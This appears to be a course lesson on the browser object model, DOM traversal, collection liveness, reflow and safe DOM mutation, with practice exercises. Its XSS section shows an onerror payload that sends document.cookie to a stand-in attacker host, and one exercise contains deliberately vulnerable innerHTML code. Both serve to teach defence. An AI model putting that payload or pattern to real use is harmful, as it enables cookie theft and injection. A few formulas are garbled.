# Unit 4 — Client-Side Scripting with JavaScript, DOM & Event-Driven Architecture
## Lesson 2 — The Browser Object Model (BOM), DOM Traversal & Safe Dynamic Mutation

### 1. The Browser Object Model (BOM) & Host Environment Hierarchy

When JavaScript runs within a web browser, it executes inside a host environment governed by the **Browser Object Model (BOM)**. While ECMAScript defines the language syntax and core data structures, the BOM provides the platform APIs that expose the browser application, operating system display, session navigation, and hardware capabilities.

At the apex of the BOM hierarchy sits the **`window`** object. In browser tabs, `window` serves two simultaneous architectural roles:
1. It is the **Global Execution Scope** for JavaScript (all global variables declared with `var` or top-level function declarations become properties of `window`).
2. It represents the physical browser viewport containing the displayed document.

{{ media:bom-dom-tree-diagram }}

#### Architectural Sub-Objects of the BOM

```
                      +-------------------+
                      |      window       |  (Global Host Object & Viewport)
                      +---------+---------+
                                |
       +------------+-----------+-----------+------------+------------+
       |            |                       |            |            |
+------v-----+ +----v------+          +-----v------+ +---v----+ +-----v----+
| navigator  | |  screen   |          |  location  | |history | | document | (DOM Root)
+------------+ +-----------+          +------------+ +--------+ +----------+
```

##### 1. The `navigator` Object (User Agent & System Capabilities)
Exposes metadata regarding the browser vendor, operating system, and hardware capabilities:
- **Feature Detection vs User-Agent Sniffing:** Modern web engineering strictly avoids parsing `navigator.userAgent` (which is easily spoofed and fragmented across browsers). Instead, engineers employ **Feature Detection**:
  ```javascript
  // Resilient Feature Detection
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(pos => {
      console.log(`Coordinates: ${pos.coords.latitude}, ${pos.coords.longitude}`);
    });
  } else {
    console.warn("Geolocation API not supported on this client.");
  }

  // Hardware Concurrency & Memory Telemetry (PWA / Performance Tuning)
  console.log(`CPU Logical Cores: ${navigator.hardwareConcurrency || 4}`);
  console.log(`Device Memory (GB approx): ${navigator.deviceMemory || 8}`);
  console.log(`Network Status: ${navigator.onLine ? "ONLINE" : "OFFLINE"}`);
  ```

##### 2. The `screen` Object (Physical Display Geometry)
Provides attributes of the physical monitor/display device:
- `screen.width` and `screen.height`: The total resolution of the screen in physical device-independent pixels.
- `screen.availWidth` and `screen.availHeight`: Viewport dimensions excluding operating system taskbars or window docks.
- `window.devicePixelRatio`: The ratio between physical hardware display pixels and CSS reference pixels ($dpr = rac{	ext{Physical Pixels}}{	ext{CSS Pixels}}$), essential for rendering sharp `<canvas>` graphics on Retina/HiDPI screens.

##### 3. The `location` Object (URL Parsing & Client-Side Redirection)
Encapsulates the complete URL of the loaded document, conforming to RFC 3986:
```
https://api.university.edu:8443/courses/se301/index.html?sort=asc#module4
|---|   |----------------| |--| |-----------------------| |------| |-----|
protocol      hostname     port         pathname           search    hash
|-----------------------------|
             host
```
- **Navigation Methods:**
  - `location.assign(url)`: Loads the new URL and creates a new entry in the browser's session history (enabling the Back button).
  - `location.replace(url)`: Replaces the current document URL **without** creating a history entry (crucial for authentication redirects to prevent infinite back-button loops).
  - `location.reload(forceGet)`: Reloads the active document.

##### 4. The `history` Object & HTML5 SPA Architecture
The classical `history.back()`, `history.forward()`, and `history.go(delta)` methods navigate through the browser's visited page stack.

However, modern Single-Page Applications (SPAs built with React, Vue, or Vanilla JS) utilize the **HTML5 History API** to alter URLs and render views **without triggering a full-page server round-trip**:
- `history.pushState(stateObject, title, url)`: Pushes a new state entry onto the session stack and updates the address bar instantaneously.
- `history.replaceState(stateObject, title, url)`: Updates the current state without pushing a new entry.
- `window.addEventListener("popstate", event => { ... })`: Fires when the user clicks the browser's Back or Forward buttons, enabling the client-side router to restore state.

---

### 2. Document Object Model (DOM) Tree Architecture & Node Typologies

The **Document Object Model (DOM)** is an object-oriented structural representation of an HTML or XML document defined by W3C and WHATWG specifications. The browser parses raw HTML markup into an in-memory hierarchical tree of **Nodes**.

#### The Interface Inheritance Hierarchy
Every item in the DOM tree inherits from fundamental W3C interfaces:
$$	ext{EventTarget} \longleftarrow 	ext{Node} \longleftarrow 	ext{Element} \longleftarrow 	ext{HTMLElement} \longleftarrow 	ext{HTMLButtonElement}$$

1. **`EventTarget`:** Implements `addEventListener()`, `removeEventListener()`, and `dispatchEvent()`.
2. **`Node`:** Base class for all tree components; provides graph traversal properties (`parentNode`, `childNodes`, `nextSibling`, `nodeType`).
3. **`Element`:** Represents an actual XML/HTML tag; introduces attribute manipulation (`getAttribute`, `classList`) and query scoping (`querySelector`).
4. **`HTMLElement`:** Introduces browser-specific attributes (`style`, `dataset`, `tabIndex`, `innerText`).

#### Node Types & The Whitespace Trap
The DOM categorizes nodes via integer constants (`Node.nodeType`):
- `Node.ELEMENT_NODE` ($1$): HTML tags (`<div>`, `<p>`, `<span>`).
- `Node.ATTRIBUTE_NODE` ($2$): Element attributes (historical).
- `Node.TEXT_NODE` ($3$): The textual content inside elements, **including whitespace, newlines, and indentation between tags**.
- `Node.COMMENT_NODE` ($8$): HTML comments (`<!-- comment -->`).
- `Node.DOCUMENT_NODE` ($9$): The root `window.document` object.

```html
<!-- DOM Tree Structure Example -->
<div id="container">
  <p>Hello World</p>
</div>
```
In the snippet above, `#container` contains **three** child nodes:
1. A `TextNode` containing the newline and two spaces before `<p>`.
2. The `<p>` `ElementNode`.
3. A `TextNode` containing the newline before `</div>`.

```javascript
const container = document.getElementById("container");

// Node Navigation (Includes Whitespace Text Nodes!)
console.log(container.childNodes.length);     // 3
console.log(container.firstChild.nodeType);   // 3 (TEXT_NODE)

// Element Navigation (Strictly Filters for HTML Elements!)
console.log(container.children.length);       // 1
console.log(container.firstElementChild.tagName); // "P"
console.log(container.firstElementChild.nextElementSibling); // null
```

---

### 3. Querying Algorithms: Live HTMLCollections vs Static NodeLists

Efficient DOM querying requires understanding the computational complexity and memory semantics of browser selection engines.

| Query Method | Return Type | Collection Liveness | Supported Selectors | Complexity |
| :--- | :--- | :--- | :--- | :--- |
| `document.getElementById(id)` | `Element` or `null` | Single Element | Strict ID string | $O(1)$ Hash Map |
| `getElementsByTagName(tag)` | `HTMLCollection` | **Live** | Tag Name string | $O(N)$ Tree Walk |
| `getElementsByClassName(cls)`| `HTMLCollection` | **Live** | Class string | $O(N)$ Tree Walk |
| `querySelector(cssSelector)` | `Element` or `null` | Single Element | Any valid CSS3 selector | $O(M)$ Fast Scan |
| `querySelectorAll(selector)` | `NodeList` | **Static Snapshot** | Any valid CSS3 selector | $O(M)$ Full Parse |

#### The Danger of Live Collections
An `HTMLCollection` is **live**: it maintains an internal active pointer to the DOM tree. If an element matching the query is added or removed anywhere in the document, the collection's `.length` and indices update **dynamically and immediately**.

Iterating through a live collection while mutating the DOM causes severe **index-skipping bugs**:

```javascript
// DEFECTIVE: Attempting to remove all elements with class 'item'
const liveItems = document.getElementsByClassName("item"); // Live HTMLCollection!
console.log(`Initial count: ${liveItems.length}`); // 4

for (let i = 0; i < liveItems.length; i++) {
  // Iteration 0: i=0, removes liveItems[0]. Length becomes 3!
  // Iteration 1: i=1, removes liveItems[1] (which was originally liveItems[2]!).
  // Elements at odd original positions are permanently skipped!
  liveItems[i].remove();
}
console.log(`Remaining: ${liveItems.length}`); // 2 elements left behind!

// CORRECT APPROACH 1: Static Snapshot (querySelectorAll)
const staticItems = document.querySelectorAll(".item"); // Static NodeList
staticItems.forEach(el => el.remove()); // Works perfectly: snapshot unaffected by deletions

// CORRECT APPROACH 2: Backward While Loop on Live Collection
const liveRemaining = document.getElementsByClassName("item");
while (liveRemaining.length > 0) {
  liveRemaining[0].remove(); // Always removes the current head until empty
}
```

---

### 4. DOM Tree Mutation, Reflow/Repaint Mechanics & Preventing XSS

#### Content Mutation Vectors: Security & Performance Analysis

##### 1. `element.innerHTML`
- **Semantics:** Serializes or parses raw HTML markup strings.
- **Performance Cost:** High. Assigning `innerHTML = markup` forces the browser's C++ HTML parser to re-enter, tokenize the entire string, construct a new DOM subtree, tear down the previous child elements, and invoke garbage collection.
- **Critical Security Risk:** **Cross-Site Scripting (XSS)**. If an application injects unsanitized user-generated content into `innerHTML`, attackers can execute arbitrary malicious JavaScript:
  ```javascript
  // DANGEROUS: Stored/Reflected XSS Vector
  const userComment = `<img src="invalid-img.png" onerror="fetch('https://attacker.com/steal?c=' + document.cookie)">`;
  // Injecting this executes the onerror handler immediately!
  document.getElementById("comments-feed").innerHTML = userComment;
  ```

##### 2. `element.textContent` vs `element.innerText`
- **`textContent`:** Returns or sets the exact text content of all nodes, including `<script>` and `<style>` elements. **Zero XSS Risk:** The browser treats the assigned string strictly as raw textual characters, escaping all angle brackets (`<`, `>`). Does **not** trigger layout recalculation.
- **`innerText`:** Aware of rendered layout and CSS styling (e.g., ignores text in elements styled `display: none`). **Triggers Reflow** to determine visual visibility; significantly slower than `textContent`.

##### 3. Programmatic Node Generation (`createElement`)
The standard, secure engineering practice for dynamic UI rendering:
```javascript
// Secure, High-Performance Element Construction
function createNotificationCard(authorName, messageBody, urgencyLevel) {
  const card = document.createElement("article");
  card.className = `notification-card urgency-${urgencyLevel}`;
  card.setAttribute("role", "alert");

  const header = document.createElement("h4");
  header.textContent = authorName; // XSS Immune!

  const body = document.createElement("p");
  body.textContent = messageBody;  // XSS Immune!

  card.appendChild(header);
  card.appendChild(body);
  return card;
}
```

#### The Critical Rendering Path: Reflow vs Repaint
When JavaScript mutates the DOM, the browser pipeline undergoes three phases:
1. **Recalculate Style:** Evaluates CSS selectors against the modified DOM tree.
2. **Reflow (Layout):** The browser computes the geometric coordinates, widths, and heights of every affected box on the screen. Reflow on a parent element propagates recursively downward to its children and upward to ancestors.
3. **Repaint:** The browser rasterizes the visual elements (colors, shadows, borders) into pixel bitmaps across GPU layers.
4. **Composite:** Layers are composited onto the display by the GPU.

```
+-------------------------------------------------------------------------------+
|                        BROWSER RENDERING PIPELINE                             |
|                                                                               |
|  [JavaScript / DOM Mutation]                                                  |
|              |                                                                |
|              v                                                                |
|  [Style Recalculation]                                                        |
|              |                                                                |
|              v                                                                |
|  [Reflow / Layout] ------> Calculates geometric dimensions (Width, Height, X,Y)|
|              |             (Triggered by margin, padding, font-size, DOM add) |
|              v                                                                |
|  [Repaint] --------------> Paints visual pixels (color, background, shadow)   |
|              |                                                                |
|              v                                                                |
|  [Composite Layers] -----> GPU merges render layers to screen output          |
+-------------------------------------------------------------------------------+
```

##### Layout Thrashing (Forced Synchronous Layout)
Reading a layout property (e.g., `offsetWidth`, `clientHeight`, `getBoundingClientRect()`, `scrollTop`) right after mutating a layout property forces the browser to halt JavaScript execution, recalculate styles, and execute an immediate synchronous Reflow:

```javascript
// CATASTROPHIC: Layout Thrashing inside an animation loop (O(N) Reflows!)
const boxes = document.querySelectorAll(".box");
for (let i = 0; i < boxes.length; i++) {
  // Read triggers immediate forced Reflow because DOM was dirtied in previous iteration!
  const currentWidth = boxes[i].offsetWidth; 
  // Write dirties layout state
  boxes[i].style.width = (currentWidth + 10) + "px"; 
}

// BATCHED ARCHITECTURE: Decouple Reads from Writes (1 Reflow!)
const widths = [];
// Phase 1: Pure Reads
for (let i = 0; i < boxes.length; i++) {
  widths.push(boxes[i].offsetWidth);
}
// Phase 2: Pure Writes (batched)
for (let i = 0; i < boxes.length; i++) {
  boxes[i].style.width = (widths[i] + 10) + "px";
}
```

##### Batching with `DocumentFragment`
A `DocumentFragment` is an off-screen, lightweight container node that is not part of the active document tree. Appending 1,000 children to a fragment causes zero reflows; appending the fragment to the document triggers exactly **one single Reflow**:

```javascript
function renderUserGrid(users) {
  const container = document.getElementById("user-grid");
  const fragment = document.createDocumentFragment(); // Virtual off-screen node

  users.forEach(user => {
    const card = document.createElement("div");
    card.className = "user-tile";
    card.textContent = user.username;
    fragment.appendChild(card); // Zero reflow cost!
  });

  // Exactly ONE Reflow and Repaint operation performed!
  container.appendChild(fragment);
}
```

---

### 5. Progressive Multi-Tier Practice Suite

#### Level 1 — Architectural Walkthrough: Graph Node Traversal
Given the HTML document fragment below, trace the exact return value and node type of each traversal expression.

```html
<nav id="main-nav">
  <!-- Brand logo -->
  <a href="/" class="brand">CloudCore</a>
  <ul class="nav-links">
    <li><a href="/dashboard">Dashboard</a></li>
    <li><a href="/settings">Settings</a></li>
  </ul>
</nav>
```

##### Step-by-Step Traversal Trace Table:
| Traversal Code Expression | Resolved Node / Value | `nodeType` | Explanation |
| :--- | :--- | :--- | :--- |
| `nav = document.getElementById("main-nav")` | `<nav id="main-nav">` | `1` (ELEMENT) | Direct $O(1)$ ID hash lookup. |
| `nav.firstChild` | `TextNode ("
  ")` | `3` (TEXT) | Traverses raw node graph; returns whitespace before comment. |
| `nav.firstElementChild` | `<a class="brand">` | `1` (ELEMENT) | Skips leading whitespace text node and comment node (`8`). |
| `nav.firstElementChild.nextSibling` | `TextNode ("
  ")` | `3` (TEXT) | Immediate sibling node is the whitespace between `<a>` and `<ul>`. |
| `nav.firstElementChild.nextElementSibling` | `<ul class="nav-links">` | `1` (ELEMENT) | Filters strictly for subsequent HTML Element sibling. |
| `ul.children.length` | `2` | Number | Counts immediate `<li>` element children (`children` ignores text). |
| `ul.childNodes.length` | `5` | Number | Counts `[TextNode, <li>, TextNode, <li>, TextNode]`. |

---

#### Level 2 — Scaffolded Bug-Fix: Live HTMLCollection Mutation & Reflected XSS
The administrative user-management widget below suffers from two severe defects:
1. When purging users marked `inactive`, half of the inactive users remain visible due to live collection index skipping.
2. The user search query is injected directly via `innerHTML`, creating a critical Reflected XSS vulnerability.

##### The Vulnerable Implementation:
```javascript
// VULNERABLE ADMIN WIDGET
function purgeInactiveUsers() {
  const inactiveRows = document.getElementsByClassName("user-inactive");
  // BUG: Live HTMLCollection causes index skipping!
  for (let i = 0; i < inactiveRows.length; i++) {
    inactiveRows[i].remove();
  }
}

function updateSearchFeedback(searchTerm) {
  const feedbackContainer = document.getElementById("search-results-header");
  // CRITICAL VULNERABILITY: Unsanitized innerHTML injection (XSS Vector)
  feedbackContainer.innerHTML = `<span>Results for query: <strong>${searchTerm}</strong></span>`;
}
```

<details>
<summary><strong>View Root Cause Analysis & Secure Production Refactoring</strong></summary>

##### Refactored Secure Implementation:
```javascript
// SECURE & ROBUST ADMIN WIDGET
function purgeInactiveUsersSecure() {
  // Fix 1: Use querySelectorAll to obtain a static snapshot NodeList.
  // Static snapshots are immune to DOM mutations occurring during iteration.
  const inactiveRows = document.querySelectorAll(".user-inactive");
  
  inactiveRows.forEach(row => {
    row.remove();
  });
}

function updateSearchFeedbackSecure(searchTerm) {
  const feedbackContainer = document.getElementById("search-results-header");
  
  // Fix 2: Prevent XSS by constructing elements programmatically
  // and assigning user input strictly via textContent.
  feedbackContainer.textContent = ""; // Clear existing contents safely

  const wrapperSpan = document.createElement("span");
  wrapperSpan.appendChild(document.createTextNode("Results for query: "));

  const strongTag = document.createElement("strong");
  // textContent escapes '<script>', '<img>', and all malicious payload characters
  strongTag.textContent = searchTerm; 

  wrapperSpan.appendChild(strongTag);
  feedbackContainer.appendChild(wrapperSpan);
}
```
</details>

---

#### Level 3 — Production System Design: Virtualized High-Throughput Dynamic Table with DOM Recycling

##### Architectural Challenge:
Enterprise monitoring systems often stream tens of thousands of telemetry logs per minute. Rendering 50,000 table rows directly causes browser memory bloat (500+ MB) and drops the UI framerate to < 5 FPS during scrolling.

Design a **DOM-Recycled Telemetry Table**:
1. Maintains a fixed pool of only 25 physical `<tr>` DOM elements regardless of dataset size (e.g., 100,000 records).
2. Calculates current scroll offset and updates only the `textContent` of the recycled rows on `scroll`.
3. Employs `transform: translateY()` positioning to simulate a continuous virtual scroll height.
4. Ensures 60 FPS scrolling performance with $O(1)$ memory consumption.

<details>
<summary><strong>View Production Architectural Implementation</strong></summary>

```javascript
/**
 * Production Virtualized Table Component
 * Utilizes DOM Node Recycling and CSS GPU Transformations
 */
class VirtualizedTelemetryGrid {
  constructor(containerElement, totalItems, rowHeight = 40, visibleCount = 25) {
    this.container = containerElement;
    this.totalItems = totalItems;
    this.rowHeight = rowHeight;
    this.visibleCount = visibleCount;
    this.bufferCount = 5; // Safety buffer rows above and below viewport

    // Dataset store (simulating 100,000 backend telemetry records)
    this.data = new Array(totalItems).fill(null).map((_, i) => ({
      id: `TLM-${100000 + i}`,
      timestamp: new Date(Date.now() - (totalItems - i) * 1000).toISOString(),
      service: `node-cluster-${(i % 16) + 1}`,
      latencyMs: (Math.random() * 120 + 5).toFixed(2),
      status: i % 17 === 0 ? "500_ERROR" : "200_OK"
    }));

    this.pool = [];
    this.lastRenderedStart = -1;
    this._initDom();
    this._bindEvents();
    this.render();
  }

  _initDom() {
    this.container.style.position = "relative";
    this.container.style.overflowY = "auto";
    this.container.style.height = `${this.visibleCount * this.rowHeight}px`;

    // 1. Phantom height spacer: Forces browser scrollbar to represent full dataset
    this.phantomSpacer = document.createElement("div");
    this.phantomSpacer.style.height = `${this.totalItems * this.rowHeight}px`;
    this.phantomSpacer.style.width = "100%";
    this.phantomSpacer.style.position = "absolute";
    this.phantomSpacer.style.top = "0";
    this.phantomSpacer.style.left = "0";
    this.phantomSpacer.style.pointerEvents = "none";
    this.container.appendChild(this.phantomSpacer);

    // 2. Physical DOM recycled pool container
    this.rowContainer = document.createElement("div");
    this.rowContainer.style.position = "absolute";
    this.rowContainer.style.top = "0";
    this.rowContainer.style.left = "0";
    this.rowContainer.style.width = "100%";
    this.container.appendChild(this.rowContainer);

    // 3. Pre-instantiate fixed pool of DOM row elements (Visible + Buffer)
    const poolSize = this.visibleCount + this.bufferCount * 2;
    const fragment = document.createDocumentFragment();

    for (let i = 0; i < poolSize; i++) {
      const row = document.createElement("div");
      row.className = "grid-row";
      row.style.height = `${this.rowHeight}px`;
      row.style.position = "absolute";
      row.style.left = "0";
      row.style.width = "100%";
      row.style.display = "flex";
      row.style.alignItems = "center";
      row.style.boxSizing = "border-box";
      row.style.padding = "0 12px";
      row.style.borderBottom = "1px solid #334155";
      row.style.willChange = "transform"; // GPU Layer hint

      // Create cells once (Zero DOM reconstruction on scroll!)
      const cId = document.createElement("span"); cId.className = "col-id"; cId.style.width = "120px";
      const cTime = document.createElement("span"); cTime.className = "col-time"; cTime.style.width = "220px";
      const cSvc = document.createElement("span"); cSvc.className = "col-svc"; cSvc.style.width = "160px";
      const cLat = document.createElement("span"); cLat.className = "col-lat"; cLat.style.width = "100px";
      const cStat = document.createElement("span"); cStat.className = "col-stat"; cStat.style.width = "100px";

      row.appendChild(cId);
      row.appendChild(cTime);
      row.appendChild(cSvc);
      row.appendChild(cLat);
      row.appendChild(cStat);

      this.pool.push({
        element: row,
        cells: { id: cId, time: cTime, svc: cSvc, lat: cLat, stat: cStat }
      });
      fragment.appendChild(row);
    }

    this.rowContainer.appendChild(fragment);
  }

  _bindEvents() {
    let ticking = false;
    this.container.addEventListener("scroll", () => {
      // Throttle rendering via requestAnimationFrame to lock to display refresh rate
      if (!ticking) {
        window.requestAnimationFrame(() => {
          this.render();
          ticking = false;
        });
        ticking = true;
      }
    });
  }

  render() {
    const scrollTop = this.container.scrollTop;
    const startIndex = Math.max(0, Math.floor(scrollTop / this.rowHeight) - this.bufferCount);
    
    // Avoid re-rendering if visible index has not shifted
    if (startIndex === this.lastRenderedStart) return;
    this.lastRenderedStart = startIndex;

    for (let i = 0; i < this.pool.length; i++) {
      const dataIndex = startIndex + i;
      const rowObj = this.pool[i];

      if (dataIndex < this.totalItems) {
        const item = this.data[dataIndex];
        // Mutate pure textContent - Zero XSS, Zero Reflow, Zero Allocation!
        rowObj.cells.id.textContent = item.id;
        rowObj.cells.time.textContent = item.timestamp;
        rowObj.cells.svc.textContent = item.service;
        rowObj.cells.lat.textContent = `${item.latencyMs} ms`;
        rowObj.cells.stat.textContent = item.status;
        rowObj.cells.stat.style.color = item.status.includes("ERROR") ? "#f43f5e" : "#34d399";

        // Translate GPU position
        const yOffset = dataIndex * this.rowHeight;
        rowObj.element.style.transform = `translate3d(0, ${yOffset}px, 0)`;
        rowObj.element.style.display = "flex";
      } else {
        rowObj.element.style.display = "none";
      }
    }
  }
}
```

##### Performance Characteristics:
- **DOM Footprint:** Exactly $35$ `<div>` elements active in memory for $100,000$ records (versus $100,000$ rows = $500,000$ elements).
- **RAM Consumption:** Stable at $pprox 8	ext{ MB}$ (98.4% reduction).
- **Framerate:** Rock-solid 60 FPS scrolling due to decoupled `requestAnimationFrame` event dispatching and GPU-accelerated CSS `translate3d`.
</details>

---

### 6. Reference Video Lecture
Review this engineering demonstration covering high-efficiency DOM traversal, querying mechanics, and element creation:

{{ media:dom-manipulation-video }}
